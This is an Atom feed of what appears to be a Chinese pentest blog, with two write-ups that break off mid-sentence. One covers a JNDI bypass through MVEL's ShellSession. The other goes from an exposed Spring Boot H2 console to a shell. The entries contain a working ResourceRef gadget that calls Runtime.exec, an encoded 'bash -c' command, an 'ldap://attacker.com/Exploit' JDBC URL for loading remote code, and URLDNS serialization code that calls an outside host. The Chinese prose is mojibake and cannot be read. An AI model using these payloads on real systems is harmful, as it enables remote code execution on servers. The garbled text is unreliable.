<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ğŸ˜Š#</title>
  
  
  <link href="https://jkme.github.io/atom.xml" rel="self"/>
  
  <link href="https://jkme.github.io/"/>
  <updated>2022-03-21T06:53:39.719Z</updated>
  <id>https://jkme.github.io/</id>
  
  <author>
    <name>JKme</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JNDI Bypass - MVEL</title>
    <link href="https://jkme.github.io/2022/03/21/jndi-exec-by-mvel.html"/>
    <id>https://jkme.github.io/2022/03/21/jndi-exec-by-mvel.html</id>
    <published>2022-03-20T16:00:00.000Z</published>
    <updated>2022-03-21T06:53:39.719Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æµ‹è¯•èƒŒæ™¯"><a href="#æµ‹è¯•èƒŒæ™¯" class="headerlink" title="æµ‹è¯•èƒŒæ™¯"></a>æµ‹è¯•èƒŒæ™¯</h2><p>JDNIåˆ©ç”¨mvelç»•è¿‡é«˜ç‰ˆæœ¬javaé™åˆ¶çš„æ—¶å€™ï¼Œä½¿ç”¨<a href="https://ares-x.com/tools/runtime-exec/">runtime exec</a>ç¼–ç å˜å½¢ä¹‹åæ‰§è¡Œå‘½ä»¤å¤±è´¥ã€‚åªèƒ½å¼¹ä¸ªè®¡ç®—å™¨ã€‚<br><img src="/2022/03/21/jndi-exec-by-mvel/1.png"></p><h2 id="æµ‹è¯•ç»“æœ"><a href="#æµ‹è¯•ç»“æœ" class="headerlink" title="æµ‹è¯•ç»“æœ"></a>æµ‹è¯•ç»“æœ</h2><p>æµ…è“å¸ˆå‚…åœ¨<a href="https://tttang.com/archive/1405/">æ¢ç´¢é«˜ç‰ˆæœ¬JDKä¸‹JNDI æ¼æ´çš„åˆ©ç”¨æ–¹æ³•</a>ä¸­ç»™å‡ºçš„æ‰§è¡Œæ–¹å¼:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ResourceRef</span> <span class="token function">tomcat_MVEL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.mvel2.sh.ShellSession"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>            <span class="token string">"push Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ref<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…ˆè¯´ç»“è®ºï¼šæŠŠæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™<code>push</code>æŒ‡ä»¤å»æ‰ï¼Œå¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚</p><h2 id="åŸå› æ¢ç´¢"><a href="#åŸå› æ¢ç´¢" class="headerlink" title="åŸå› æ¢ç´¢"></a>åŸå› æ¢ç´¢</h2><p>å…ˆæŠŠæµ‹è¯•çš„å‘½ä»¤åšä¸€æ¬¡ç¼–ç :<code>open /System/Applications/Calculator.app/Contents/MacOS/Calculator</code><br>ç»è¿‡ç¼–ç ä¹‹åï¼š <code>bash -c &#123;echo,b3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9y&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p><h3 id="å­˜åœ¨pushçš„æ—¶å€™"><a href="#å­˜åœ¨pushçš„æ—¶å€™" class="headerlink" title="å­˜åœ¨pushçš„æ—¶å€™"></a>å­˜åœ¨pushçš„æ—¶å€™</h3><p>ç»è¿‡ä¸€è·¯çš„è·³è½¬ï¼Œè¿›å…¥åˆ°<code>_exec()</code>å‡½æ•°ï¼Œè°ƒç”¨å †æ ˆå¦‚ä¸‹:</p><pre class="line-numbers language-none"><code class="language-none">_exec:122, ShellSession (org.mvel2.sh)exec:463, ShellSession (org.mvel2.sh)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)getObjectInstance:211, BeanFactory (org.apache.naming.factory)getObjectInstance:321, NamingManager (javax.naming.spi)decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)lookup:138, RegistryContext (com.sun.jndi.rmi.registry)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:417, InitialContext (javax.naming)main:9, RMITest (com.rmi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‡½æ•°åœ¨108è¡Œå¯¹ä¼ å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œåˆ†å‰²: <code>String[] inTokens = this.inBuffer.append(this.commandBuffer).toString().split(&quot;\\s&quot;);</code>ï¼Œ <code>\s</code>è¡¨ç¤ºç©ºæ ¼ã€tabã€æ¢è¡Œ: <code>&#39; &#39;, &#39;\t&#39;, &#39;\n&#39;, &#39;\r&#39;</code>ç­‰<br><img src="/2022/03/21/jndi-exec-by-mvel/2.png"><br>åˆ†å‰²ä¹‹åï¼Œå¾—åˆ°<code>inTokens</code>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">inTokens <span class="token operator">=</span> <span class="token punctuation">&#123;</span>String<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>@1355<span class="token punctuation">&#125;</span>  <span class="token number">0</span> <span class="token operator">=</span> <span class="token string">"push"</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token string">"Runtime.getRuntime().exec('bash"</span> <span class="token number">2</span> <span class="token operator">=</span> <span class="token string">"-c"</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token string">"&#123;echo,L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;');"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åè·å–<code>inTokens[1:]</code>èµ‹å€¼ç»™<code>passParamters</code>ã€‚ç»§ç»­è·Ÿè¿›åˆ°119è¡Œä»£ç : <code>((Command)this.commands.get(inTokens[0])).execute(this, passParameters);</code>ï¼Œè¿›å…¥è°ƒç”¨pushæŒ‡ä»¤çš„å‡½æ•°ï¼Œæ­¤æ—¶çš„å‚æ•°å¦‚ä¸‹ï¼š<br><img src="/2022/03/21/jndi-exec-by-mvel/3.png"><br>åœ¨<code>pushContext.java</code>é‡Œé¢è°ƒç”¨<code>MVEL.eval</code>è§£æMVELè¡¨è¾¾å¼ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥çœ‹å‡ºæ¥æ‰§è¡Œ<code>MVEL.eval</code>çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯args[0]: <code>Runtime.getRuntime().exec(&#39;bash</code>ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œå¤±è´¥:<br><img src="/2022/03/21/jndi-exec-by-mvel/4.png"></p><h3 id="å»æ‰pushçš„æ—¶å€™"><a href="#å»æ‰pushçš„æ—¶å€™" class="headerlink" title="å»æ‰pushçš„æ—¶å€™"></a>å»æ‰pushçš„æ—¶å€™</h3><p>å½“æ²¡æœ‰pushçš„æ—¶å€™ï¼Œæ‰§è¡Œåˆ°<code>SHellSession.java</code>ä¼šè·³è½¬åˆ°123è¡Œä»£ç åˆ†æ”¯ï¼Œç„¶åå®ä¾‹åŒ–<code>MVELInterpretedRuntime</code>ä¹‹åè°ƒç”¨<code>parse()</code>å‡½æ•°:<br><img src="/2022/03/21/jndi-exec-by-mvel/5.png"><br>ç»è¿‡ä¸€ç³»åˆ—è§£æåˆ¤æ–­ä¹‹åæœ€ç»ˆè¿›å…¥åˆ°<code>propertyAccessor.class</code>çš„896è¡Œï¼Œè·å–åˆ°<code>Runtime</code>ä¸Šä¸‹æ–‡ä¹‹åè°ƒç”¨ä¼ å…¥çš„å‚æ•°:<br><img src="/2022/03/21/jndi-exec-by-mvel/6.png"><br>å‡½æ•°è°ƒç”¨å †æ ˆ:</p><pre class="line-numbers language-none"><code class="language-none">getMethod:995, PropertyAccessor (org.mvel2)getNormal:181, PropertyAccessor (org.mvel2)get:145, PropertyAccessor (org.mvel2)get:125, PropertyAccessor (org.mvel2)getReducedValue:187, ASTNode (org.mvel2.ast)parseAndExecuteInterpreted:112, MVELInterpretedRuntime (org.mvel2)parse:58, MVELInterpretedRuntime (org.mvel2)_exec:171, ShellSession (org.mvel2.sh)exec:463, ShellSession (org.mvel2.sh)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)getObjectInstance:211, BeanFactory (org.apache.naming.factory)getObjectInstance:321, NamingManager (javax.naming.spi)decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)lookup:138, RegistryContext (com.sun.jndi.rmi.registry)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:417, InitialContext (javax.naming)main:9, RMITest (com.rmi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://tttang.com/archive/1405/">æ¢ç´¢é«˜ç‰ˆæœ¬JDKä¸‹JNDIæ¼æ´çš„åˆ©ç”¨æ–¹æ³•</a></li><li><a href="https://ares-x.com/tools/runtime-exec/">RUNTIME.EXEC PAYLOAD ENCODE</a></li><li><a href="https://github.com/JKme/EvilRMI">EvilRMI</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;æµ‹è¯•èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#æµ‹è¯•èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;æµ‹è¯•èƒŒæ™¯&quot;&gt;&lt;/a&gt;æµ‹è¯•èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;JDNIåˆ©ç”¨mvelç»•è¿‡é«˜ç‰ˆæœ¬javaé™åˆ¶çš„æ—¶å€™ï¼Œä½¿ç”¨&lt;a href=&quot;https://ares-x.com/tools/runtime-exec/&quot;&gt;runtime exec&lt;/a&gt;ç¼–ç å˜å½¢ä¹‹åæ‰§è¡Œå‘½ä»¤å¤±è´¥ã€‚åªèƒ½å¼¹ä¸ªè®¡ç®—å™¨ã€‚&lt;br&gt;&lt;img src=&quot;/2022/03/21/jndi-exec-by-mvel/1.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;æµ‹è¯•ç»“æœ&quot;&gt;&lt;a href=&quot;#æµ‹è¯•ç»“æœ&quot; class=&quot;headerlink&quot; title=&quot;æµ‹è¯•ç»“æœ&quot;&gt;&lt;/a&gt;æµ‹è¯•ç»“æœ&lt;/h2&gt;&lt;p&gt;æµ…è“å¸ˆå‚…åœ¨&lt;a href=&quot;https://tttang.com/archive/1405/&quot;&gt;æ¢ç´¢é«˜ç‰ˆæœ¬JDKä¸‹JNDI æ¼æ´çš„åˆ©ç”¨æ–¹æ³•&lt;/a&gt;ä¸­ç»™å‡ºçš„æ‰§è¡Œæ–¹å¼:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ResourceRef&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;tomcat_MVEL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token class-name&quot;&gt;ResourceRef&lt;/span&gt; ref &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ResourceRef&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;org.mvel2.sh.ShellSession&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;org.apache.naming.factory.BeanFactory&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    ref&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;StringRefAddr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;forceString&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;a=exec&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    ref&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;StringRefAddr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token string&quot;&gt;&quot;push Runtime.getRuntime().exec(&#39;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#39;);&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; ref&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å…ˆè¯´ç»“è®ºï¼šæŠŠæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™&lt;code&gt;push&lt;/code&gt;æŒ‡ä»¤å»æ‰ï¼Œå¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚&lt;/p&gt;
&lt;h2 id=&quot;åŸå› æ¢ç´¢&quot;&gt;&lt;a href=&quot;#åŸå› æ¢ç´¢&quot; class=&quot;headerlink&quot; title=&quot;åŸå› æ¢ç´¢&quot;&gt;&lt;/a&gt;åŸå› æ¢ç´¢&lt;/h2&gt;&lt;p&gt;å…ˆæŠŠæµ‹è¯•çš„å‘½ä»¤åšä¸€æ¬¡ç¼–ç :&lt;code&gt;open /System/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/code&gt;&lt;br&gt;ç»è¿‡ç¼–ç ä¹‹åï¼š &lt;code&gt;bash -c &amp;#123;echo,b3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9y&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;å­˜åœ¨pushçš„æ—¶å€™&quot;&gt;&lt;a href=&quot;#å­˜åœ¨pushçš„æ—¶å€™&quot; class=&quot;headerlink&quot; title=&quot;å­˜åœ¨pushçš„æ—¶å€™&quot;&gt;&lt;/a&gt;å­˜åœ¨pushçš„æ—¶å€™&lt;/h3&gt;&lt;p&gt;ç»è¿‡ä¸€è·¯çš„è·³è½¬ï¼Œè¿›å…¥åˆ°&lt;code&gt;_exec()&lt;/code&gt;å‡½æ•°ï¼Œè°ƒç”¨å †æ ˆå¦‚ä¸‹:&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>ä»Spring Boot H2 Databaseåˆ°GetShell</title>
    <link href="https://jkme.github.io/2022/03/18/from-spring-boot-to-getshell.html"/>
    <id>https://jkme.github.io/2022/03/18/from-spring-boot-to-getshell.html</id>
    <published>2022-03-17T16:00:00.000Z</published>
    <updated>2022-03-21T08:20:00.719Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-åˆ‡å…¥ç‚¹"><a href="#0x1-åˆ‡å…¥ç‚¹" class="headerlink" title="0x1. åˆ‡å…¥ç‚¹"></a>0x1. åˆ‡å…¥ç‚¹</h2><p>åœ¨æ—¥å¸¸æµ‹è¯•çš„æ—¶å€™ï¼Œä½¿ç”¨ffufå‘ç°ä¸€ä¸ª<code>/console</code>çš„æ¥å£ï¼Œæ‰“å¼€ä¹‹åå‘ç°æ˜¯H2 Databaseé¡µé¢ï¼š<br><img src="/2022/03/18/from-spring-boot-to-getshell/1.png"><br>å¦‚æœSpring Booté¡¹ç›®ä¸­åŒ…å«h2databaseå¹¶ä¸”åœ¨é…ç½®æ–‡ä»¶ä¸­å¯ç”¨h2-consoleï¼Œåˆ™å­˜åœ¨<a href="https://anquan.baidu.com/article/1078">JNDIæ³¨å…¥æ¼æ´</a>.</p><p>è®¾ç½®<code>Driver Class</code>ä¸º<code>javax.naming.InitialContext</code>ï¼Œ<code>JDBC URL</code>ä¸º<code>ldap://attacker.com/Exploit</code>ï¼š<br><img src="/2022/03/18/from-spring-boot-to-getshell/2.png"><br>æ ¹æ®<code>/env</code>æ³„æ¼çš„ä¿¡æ¯ï¼Œå¾—çŸ¥Javaç‰ˆæœ¬æ˜¯1.8.0_312ï¼Œé«˜ç‰ˆæœ¬JDKä¸­ç”±äºé»˜è®¤codebaseä¸ºtrueä»è€Œå¯¼è‡´å®¢æˆ·ç«¯é»˜è®¤ä¸ä¼šè¯·æ±‚è¿œç¨‹Serverä¸Šçš„æ¶æ„ Class, å› æ­¤ä¸å¯ä»¥ç›´æ¥ä½¿ç”¨LDAPåŠ è½½è¿œç¨‹æ¶æ„ä»£ç ã€‚</p><blockquote><p>RMIï¼šJDK 8u113ã€JDK 7u122ã€JDK 6u132 èµ· codebase é»˜è®¤ä¸º true<br>LDAPï¼šJDK 11.0.1ã€JDK 8u191ã€JDK 7u201ã€JDK 6u211 èµ· codebase é»˜è®¤ä¸º true</p></blockquote><h2 id="0x2-ç»•è¿‡å’Œåˆ©ç”¨"><a href="#0x2-ç»•è¿‡å’Œåˆ©ç”¨" class="headerlink" title="0x2. ç»•è¿‡å’Œåˆ©ç”¨"></a>0x2. ç»•è¿‡å’Œåˆ©ç”¨</h2><h3 id="åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference-Factoryç»•è¿‡"><a href="#åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference-Factoryç»•è¿‡" class="headerlink" title="åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factoryç»•è¿‡"></a>åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factoryç»•è¿‡</h3><p>åˆ©ç”¨URLDNSé“¾å¯ä»¥æ¢æµ‹Javaé»‘ç›’åº”ç”¨é‡Œé¢æŸä¸ªç±»æ˜¯å¦å­˜åœ¨, åœ¨ç‚å­—è¾ˆå’Œc0ny1å¸ˆå‚…çš„ä¸¤ç¯‡æ–‡ç« è®²çš„å¾ˆè¯¦ç»†ï¼š</p><ul><li><a href="https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw">Urldnsé“¾æ¢æµ‹ç±»å·¥å…·å‘æ”¾</a></li><li><a href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">æ„é€ javaæ¢æµ‹classååºåˆ—åŒ–gadget</a></li><li><a href="https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA">è€é“¾æ–°ç”¨ï¼Œåˆ©ç”¨URLDNSé“¾æ¢æµ‹gadget</a></li></ul><p>URLDNSçš„æµ‹è¯•ä»£ç ï¼Œç”Ÿæˆä¸€ä¸ªåºåˆ—åŒ–çš„æ•°æ®åŒ…<code>1.ser</code>ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">test</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Urldns</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"http://333.f9575af1.dns.1433.eu.org"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Field</span> f <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//hashMap.put(url, org.apache.commons.beanutils.BeanComparator.class);</span>          hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.beanutils.BeanComparator"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));</span>        <span class="token comment">//ois.readObject();</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Class</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> clazzName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span>clazzName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">defrost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºåŠ¨æ€ç”Ÿæˆçš„ç±»ä¹Ÿå¯ä»¥è¢«ååºåˆ—åŒ–ï¼Œå› æ­¤ä¸Šé¢ä»£ç 